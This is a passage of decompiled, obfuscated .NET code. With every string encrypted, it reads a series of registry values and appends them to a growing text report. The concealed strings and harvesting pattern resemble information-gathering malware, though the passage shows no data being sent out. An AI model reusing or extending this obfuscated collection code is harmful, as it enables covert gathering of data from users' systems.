						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱠᵈṆὁ⁕⅒≰⍰⑴╿☻❛⡫⥬⩤⭊ⱐⵕ⸳⽁ちㅿ㉽㍺㑾㕐㙅㝈㡈㤨㩋㭯㱳㵡㸣㼲䀹"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4414;
						}
						goto IL_446e;
						IL_4414:
						num = 370;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("@ŏɍ\u032bцՠپݢ\u0826व\u0a3cସసഺ")), Registry.GetValue(GClass0.smethod_0("\tċɺ\u0367Ѣհٴݹ\u0878ॴ੨\u0b7b\u0c74൷\u0e7b\u0f7bၿᅵታ\u137dᑢᕪᙿ\u177dᡨ\u197a\u1a62᭺ᱠᵈṆὁ⁕⅒≰⍰⑴╿☻❛⡫⥬⩤⭊ⱐⵕ⸳⽁ちㅿ㉽㍺㑾㕐㙅㝈㡈㤨㩋㭯㱳㵡㸣㼲䀹"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_446e;
						IL_446e:
						num = 372;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵈ⹆⽁さㅒ㉰㍰㑴㕿㘻㝛㡫㥬㩤㭊㱛㵱㹶㽶䀱䅶䉠䍼䐭䕟䙻䝯䡬䥬䨧䭅䱤䵶乡佭偯"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_44a1;
						}
						goto IL_44fb;
						IL_44a1:
						num = 373;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("VŲɳͱдյٽݣ࠰ड़\u0a7e୨౩൯สཊ\u1069ᅵቤ፪ᑪᔸᘸ\u173a")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵈ⹆⽁さㅒ㉰㍰㑴㕿㘻㝛㡫㥬㩤㭊㱛㵱㹶㽶䀱䅶䉠䍼䐭䕟䙻䝯䡬䥬䨧䭅䱤䵶乡佭偯"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_44fb;
						IL_44fb:
						num = 375;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥だㅭ㉚㍍㑁㕒㙾㝿㡽㤸㩑㭹㱧㴴㹀㽢䁴䅵䉫䌮䑅䕣䙿䜪䡙䥽䩵䭵䱰䵭乷伢倳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_452e;
						}
						goto IL_4588;
						IL_452e:
						num = 376;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("QŻɸ\u0378л՜ٶݪ࠷\u0945\u0a65ୱ\u0c76൶\u0e31མ\u1060ᅺር\u135cᑾᕸᙺ\u177dᡮᥲᨥ\u1b36\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥だㅭ㉚㍍㑁㕒㙾㝿㡽㤸㩑㭹㱧㴴㹀㽢䁴䅵䉫䌮䑅䕣䙿䜪䡙䥽䩵䭵䱰䵭乷伢倳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4588;
						IL_4588:
						num = 378;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑴᕼ᙭ᝯᡶᥤ\u1a70᭨ᱶᵞṔὓ⁛⅜≂⍂⑂╉☉❩⡕⥒⩖⭸ⱦⵣ⸁⽧ぞㅓ㉘㍏㑇㕔㙼㝽㡳㤶㩳㭻㱡㴲㹂㽠䁪䅫䉩䌬䑆䕥䙺䝼䠧䥑䩤䭪䱷䵧乥"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_45bb;
						}
						goto IL_4615;
						IL_45bb:
						num = 379;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("SŹɾ;йվٸݤ࠵\u0947\u0a63୷\u0c74൴ฯགྷ\u1062ᅿቿጪᑞᕩᙩ\u1772ᡠᥠᨸ\u1b38\u1c3a")), Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑴᕼ᙭ᝯᡶᥤ\u1a70᭨ᱶᵞṔὓ⁛⅜≂⍂⑂╉☉❩⡕⥒⩖⭸ⱦⵣ⸁⽧ぞㅓ㉘㍏㑇㕔㙼㝽㡳㤶㩳㭻㱡㴲㹂㽠䁪䅫䉩䌬䑆䕥䙺䝼䠧䥑䩤䭪䱷䵧乥"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4615;
						IL_4615:
						num = 381;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u001cĘȗ\u0308Џԃ\u0601\u070eࠍइਕ\u0b04ఉഄฎ༌ညᄆሞጒᐏᕹᙪᝪ\u187dᥩ\u1a7f᭥ᱽᵛṓὖ\u2040⅁≝⍟\u2459╌☎❬⡞⥟⩙\u2b75Ɑⵋ⹃⽆ぐㅑ㉍㍏㑉㕼㘾㝜㡮㥯㩩㭅㱖㵲㹳㽱䀴䅵䉽䍣䐰䕜䙾䝨䡩䥯䨪䭙䱺䵨乕佱偶兦剧卵"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4648;
						}
						goto IL_46a2;
						IL_4648:
						num = 382;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Uſɼͼзհٺݦ࠳\u0941\u0a61୵౪൪อཛྷၹᅥቚ፼ᑵᕣᙠᝰᠸ\u1938ᨺ")), Registry.GetValue(GClass0.smethod_0("\u001cĘȗ\u0308Џԃ\u0601\u070eࠍइਕ\u0b04ఉഄฎ༌ညᄆሞጒᐏᕹᙪᝪ\u187dᥩ\u1a7f᭥ᱽᵛṓὖ\u2040⅁≝⍟\u2459╌☎❬⡞⥟⩙\u2b75Ɑⵋ⹃⽆ぐㅑ㉍㍏㑉㕼㘾㝜㡮㥯㩩㭅㱖㵲㹳㽱䀴䅵䉽䍣䐰䕜䙾䝨䡩䥯䨪䭙䱺䵨乕佱偶兦剧卵"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_46a2;
						IL_46a2:
						num = 384;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑴᕼ᙭ᝯᡶᥤ\u1a70᭨ᱶᵞṔὓ⁛⅜≂⍂⑂╉☉❩⡕⥒⩖⭸ⱦⵣ⸁⽧ぞㅓ㉘㍏㑇㕔㙼㝽㡳㤶㩓㭻㱡㴲㹂㽠䁪䅫䉩䌬䑞䕤䙭䝭䡵䥡䩷䭫䱶䵬乥"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_46d5;
						}
						goto IL_472f;
						IL_46d5:
						num = 385;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("SŹɾ;й՞ٸݤ࠵\u0947\u0a63୷\u0c74൴ฯཛ\u1063ᅨቮ፸ᑮᕺᙨ\u1773ᡫᥠᨸ\u1b38\u1c3a")), Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑴᕼ᙭ᝯᡶᥤ\u1a70᭨ᱶᵞṔὓ⁛⅜≂⍂⑂╉☉❩⡕⥒⩖⭸ⱦⵣ⸁⽧ぞㅓ㉘㍏㑇㕔㙼㝽㡳㤶㩓㭻㱡㴲㹂㽠䁪䅫䉩䌬䑞䕤䙭䝭䡵䥡䩷䭫䱶䵬乥"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_472f;
						IL_472f:
						num = 387;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕒㙾㝿㡽㤸㩱㭹㱧㴴㹀㽢䁴䅵䉫䌮䑘䕢䙯䝯䡻䥯䩵䭩䱰䵪乧伢倳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4762;
						}
						goto IL_47bc;
						IL_4762:
						num = 388;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("QŻɸ\u0378лռٶݪ࠷\u0945\u0a65ୱ\u0c76൶\u0e31ཅၡᅪቨ\u137eᑬᕸᙦ\u177dᡩᥢᨥ\u1b36\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṖὑ⁅⅂≀⍀⑄╏☋❫⡛⥜⩔⭺Ⱡⵥ⸃⽥\u3040ㅍ㉺㍭㑁㕒㙾㝿㡽㤸㩱㭹㱧㴴㹀㽢䁴䅵䉫䌮䑘䕢䙯䝯䡻䥯䩵䭩䱰䵪乧伢倳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_47bc;
						IL_47bc:
						num = 390;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42ᱜᵴṾύ⁽⅄≙⍳⑧╻☳✿⠱⥒⩺⭼Ᵽⵥ\u2e65⽭〩ㅚ㉨㍫㑙㕍㙭㝤㡮"), GClass0.smethod_0("Tţɷ\u036dѢծط"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_47ef;
						}
						goto IL_4849;
						IL_47ef:
						num = 391;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[űɡͽбԽد\u074c\u0878ॾ\u0a65\u0b63౧൯วཔ\u106aᅩሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42ᱜᵴṾύ⁽⅄≙⍳⑧╻☳✿⠱⥒⩺⭼Ᵽⵥ\u2e65⽭〩ㅚ㉨㍫㑙㕍㙭㝤㡮"), GClass0.smethod_0("Tţɷ\u036dѢծط"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4849;
						IL_4849:
						num = 393;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱨᵀṖὌ⁾Ⅸ≎⍬⑪╼♰❷⡻⥭⩱⭸ⱸⵉ⹒⽲みㅸ㉼㍦㑫㕾㙐㝅㡯㥻㩧㬧㰱㵙㹍㽭䁤䅮"), GClass0.smethod_0("AŴɢ\u0366ѯաػݔ࠻स\u0a31ଶష\u0d3cำ༻\u1033ᄲ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_487c;
						}
						goto IL_48d6;
						IL_487c:
						num = 394;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gŭɵ\u0369ХԳظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱨᵀṖὌ⁾Ⅸ≎⍬⑪╼♰❷⡻⥭⩱⭸ⱸⵉ⹒⽲みㅸ㉼㍦㑫㕾㙐㝅㡯㥻㩧㬧㰱㵙㹍㽭䁤䅮"), GClass0.smethod_0("AŴɢ\u0366ѯաػݔ࠻स\u0a31ଶష\u0d3cำ༻\u1033ᄲ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_48d6;
						IL_48d6:
						num = 396;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱨᵀṖὌ⁾Ⅸ≎⍬⑪╼♰❷⡻⥭⩱⭸ⱸⵉ⹒⽲みㅸ㉼㍦㑫㕾㙐㝅㡯㥻㩧㬧㰾㵙㹍㽭䁤䅮"), GClass0.smethod_0("AŴɢ\u0366ѯաشݔ࠻स\u0a31ଳఱവ\u0e3d\u0f35\u1034ᄱ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4909;
						}
						goto IL_4963;
						IL_4909:
						num = 397;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gŭɵ\u0369ХԼظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱨᵀṖὌ⁾Ⅸ≎⍬⑪╼♰❷⡻⥭⩱⭸ⱸⵉ⹒⽲みㅸ㉼㍦㑫㕾㙐㝅㡯㥻㩧㬧㰾㵙㹍㽭䁤䅮"), GClass0.smethod_0("AŴɢ\u0366ѯաشݔ࠻स\u0a31ଳఱവ\u0e3d\u0f35\u1034ᄱ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4963;
						IL_4963:
						num = 399;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4996;
						}
						goto IL_49f0;
						IL_4996:
						num = 400;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EłɅ\u0328еԶص\u0736࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_49f0;
						IL_49f0:
						num = 402;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4a23;
						}
						goto IL_4a7d;
						IL_4a23:
						num = 403;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EłɅ\u0328еԶص\u0737࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4a7d;
						IL_4a7d:
						num = 405;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴵"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4ab0;
						}
						goto IL_4b0a;
						IL_4ab0:
						num = 406;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EłɅ\u0328еԶص\u0730࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴵"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4b0a;
						IL_4b0a:
						num = 408;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴴"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4b3d;
						}
						goto IL_4b97;
						IL_4b3d:
						num = 409;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EłɅ\u0328еԶص\u0731࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7fᱧᵍṅὼ\u206aⅯ≳⍵⑳╺☸❖⡤⥡⩧⭏ⱗⵐ⸰⽜まㅢ㉾㍿㑹㕕㙆㝏㡊㤥㨶㬳㰲㴴"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4b97;
						IL_4b97:
						num = 411;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱛᵮṹώⁿⅨ≩⍡\u2458╍♭❹"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4bca;
						}
						goto IL_4c24;
						IL_4bca:
						num = 412;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Xūɾ\u0378Ѽե٦ݬ\u085b\u0948੪\u0b7cసസ\u0e3a")), Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱛᵮṹώⁿⅨ≩⍡\u2458╍♭❹"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4c24;
						IL_4c24:
						num = 414;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4eᱟᵥṂὫ\u206aⅭ≗⍙⑤╩♵❲⡆⥬⩦⭡ⱪ"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4c57;
						}
						goto IL_4cb1;
						IL_4c57:
						num = 415;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("ZŦɿʹѷծخݞࡡ४\u0a78\u0b7d\u0c4b൯\u0e63སၯᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4eᱟᵥṂὫ\u206aⅭ≗⍙⑤╩♵❲⡆⥬⩦⭡ⱪ"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4cb1;
						IL_4cb1:
						num = 417;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑱᕻᙨᝬ\u187bᥫ\u1a7dᭋ᱙ᵻṸὺ⁼ⅴ≄⍙\u245e╡♭❲⡯⥻⩔⭕Ᵽⵢ⹍⽭つㅮ"), GClass0.smethod_0("jŢɯ\u0364"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4ce4;
						}
						goto IL_4d3e;
						IL_4ce4:
						num = 418;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^žɣ\u0367ѣթ\u065fݜ\u0859।੦\u0b7fౠ൶\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑱᕻᙨᝬ\u187bᥫ\u1a7dᭋ᱙ᵻṸὺ⁼ⅴ≄⍙\u245e╡♭❲⡯⥻⩔⭕Ᵽⵢ⹍⽭つㅮ"), GClass0.smethod_0("jŢɯ\u0364"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4d3e;
						IL_4d3e:
						num = 420;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑱᕻᙨᝬ\u187bᥫ\u1a7dᭋ᱙ᵻṸὺ⁼ⅴ≄⍙\u245e╡♭❲⡯⥻⩔⭕Ᵽⵢ⹍⽭つㅮ"), GClass0.smethod_0("uŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4d71;
						}
						goto IL_4dcb;
						IL_4d71:
						num = 421;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^žɣ\u0367ѣթ\u065fݜ\u0859।੦\u0b7fౠ൶\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("zźɵͶѱա٣ݨ\u086b॥\u0a77୪౧൦\u0e6cཪ\u106cᅤቼፌᑱᕻᙨᝬ\u187bᥫ\u1a7dᭋ᱙ᵻṸὺ⁼ⅴ≄⍙\u245e╡♭❲⡯⥻⩔⭕Ᵽⵢ⹍⽭つㅮ"), GClass0.smethod_0("uŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4dcb;
						IL_4dcb:
						num = 423;
